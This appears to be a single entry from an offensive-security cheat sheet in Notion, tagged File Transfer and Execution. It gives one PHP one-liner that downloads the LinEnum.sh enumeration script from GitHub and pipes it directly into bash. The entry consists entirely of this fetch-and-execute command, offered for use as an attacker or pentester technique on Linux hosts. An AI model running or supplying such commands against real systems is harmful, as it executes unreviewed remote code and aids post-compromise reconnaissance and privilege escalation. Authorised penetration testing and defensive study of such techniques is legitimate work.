# php download file and pipe to bash

OS: Linux, PHP
Description: Download file and execute.
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21), Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```